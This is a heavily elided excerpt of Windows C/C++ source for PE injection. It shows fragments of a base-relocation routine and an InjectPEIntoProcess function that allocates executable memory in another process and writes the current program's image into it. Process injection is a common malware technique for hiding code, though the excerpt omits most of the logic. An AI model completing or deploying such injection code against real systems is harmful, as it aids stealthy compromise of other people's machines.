...
void PerformBaseRelocation(PVOID localImage, PIMAGE_NT_HEADERS ntHeader,
  ...
  while (relocationTable->SizeOfBlock > 0) {
    ...
    DWORD relocationEntriesCount =
        ...
        sizeof(USHORT);
    PBASE_RELOCATION_ENTRY relocationRVA =
        (PBASE_RELOCATION_ENTRY)(relocationTable + 1);
    ...
    for (DWORD i = 0; i < relocationEntriesCount; i++) {
      if (relocationRVA[i].Offset) {
        ...
        PDWORD_PTR patchedAddress =
            (PDWORD_PTR)((DWORD_PTR)localImage +
...
// This PE injection runtime function handles loading and injecting the PE into
// the process.
bool InjectPEIntoProcess(DWORD pid) {
  // The current process's image base is obtained.
  PVOID imageBase = GetModuleHandle(NULL);
  PIMAGE_NT_HEADERS ntHeader =
      (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase +
  ...
  PVOID targetImage =
      VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage,
                     MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (targetImage == NULL)
    return false;

  // The base address delta between the current and target processes is
  // calculated.
  ...
  if (!WriteProcessMemory(targetProcess, targetImage, localImage,
...
// This is the main function that handles argument parsing and initiates the PE
// injection.
